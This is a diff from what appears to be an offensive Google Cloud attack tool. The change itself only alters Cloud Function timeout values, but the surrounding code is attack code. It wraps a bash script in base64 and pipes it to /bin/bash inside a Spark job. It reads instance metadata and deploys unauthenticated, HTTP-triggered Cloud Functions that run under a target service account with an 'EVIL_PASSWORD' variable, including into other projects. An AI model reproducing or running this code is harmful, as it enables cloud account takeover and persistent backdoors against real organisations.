@@ -50,7 +50,7 @@ ZONE=$(curl http://metadata.google.internal/computeMetadata/v1/instance/zone -H 
 CF_NAME=$(gcloud compute instances describe $INSTANCE_ID --zone $ZONE --format='value[](metadata.items.cf_name)')
 CF_PASSWORD=$(gcloud compute instances describe $INSTANCE_ID --zone $ZONE --format='value[](metadata.items.evilpassword)')
 gcloud services enable cloudfunctions.googleapis.com
-gcloud functions deploy $CF_NAME --set-env-vars=EVIL_PASSWORD=$CF_PASSWORD --timeout 540 --trigger-http --allow-unauthenticated --source /tmp/base_cloud_function --runtime python37 --entry-point hello_world --service-account $DEST_SA"""
+gcloud functions deploy $CF_NAME --set-env-vars=EVIL_PASSWORD=$CF_PASSWORD --timeout 300 --trigger-http --allow-unauthenticated --source /tmp/base_cloud_function --runtime python37 --entry-point hello_world --service-account $DEST_SA"""
     spark_string += "\n\nos.system(\"/bin/bash -c \\\"base64 -d <<< "
     spark_string += b64encode(bash_string.encode("utf-8")).decode("utf-8")
     spark_string += " | /bin/bash\\\"\")"
@@ -65,7 +65,7 @@ def create_gcf_in_another_project(dest_project, dest_sa, latest_cf, function_pro
     drop_cf(latest_cf)
     run_gcloud_command_local("gcloud config set project {}".format(dest_project))
     run_gcloud_command_local("gcloud services enable cloudfunctions.googleapis.com")
-    succeeded = run_gcloud_command_local("gcloud functions deploy {} --set-env-vars=EVIL_PASSWORD={} --timeout 539 --trigger-http --allow-unauthenticated --source /tmp/base_cloud_function --runtime python37 --entry-point hello_world --service-account {}".format(function_props["name"], function_props["evil_password"], dest_sa))
+    succeeded = run_gcloud_command_local("gcloud functions deploy {} --set-env-vars=EVIL_PASSWORD={} --timeout 300 --trigger-http --allow-unauthenticated --source /tmp/base_cloud_function --runtime python37 --entry-point hello_world --service-account {}".format(function_props["name"], function_props["evil_password"], dest_sa))
     print("~~~~~~~~~~ {} ~~~~~~~~~~".format(succeeded))
     if not succeeded and succeeded != "0" and succeeded != 0:
         print("gcf provisioning failed")
